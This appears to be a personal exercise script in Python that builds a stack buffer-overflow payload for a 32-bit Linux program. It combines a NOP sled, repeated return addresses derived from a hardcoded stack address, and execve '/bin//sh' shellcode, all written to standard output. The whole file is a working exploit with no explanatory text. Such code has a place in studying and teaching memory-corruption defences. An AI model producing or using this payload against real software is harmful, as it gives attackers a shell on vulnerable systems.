#!/usr/bin/env python3

import os
import sys

shellcode=b"\x31\xc0\x50\x68" + b"//sh" + b"\x68"+ b"/bin" + b"\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80"  

# 0xffffdc50 on my computer
# fl = 512

offline=200
eip = 0xffffce48

def get_eip():
    addr = eip + offline 

    buf = []

    buf.append((addr & 0x000000ff) >> 0)
    buf.append((addr & 0x0000ff00) >> 8)
    buf.append((addr & 0x00ff0000) >> 16)
    buf.append((addr & 0xff000000) >> 24)

    return buf

def main():
    buf = list(0x90 for i in range(512))

    addr=get_eip()

    for i in range(0, 40, 4):
        buf[i: i+4] = addr

    #   _l = 36
    #   buf[:_l] = list(b'a'*_l)
    #   buf[_l:_l+4] = get_eip()


    buf[-len(shellcode)-2:-2] = shellcode
    buf[-1] = 0

    os.write(1, bytes(buf))

    #os.write(1, 22 * b'a')
    #os.write(1, b'\xd0\xcd\xff\xff')
    #os.write(1, 32 * b'\x90')
    #os.write(1, shellcode)
    sys.exit(0)

if __name__ == '__main__':

    if len(sys.argv) > 1:
        eip = int(sys.argv[1], 16)

    main()


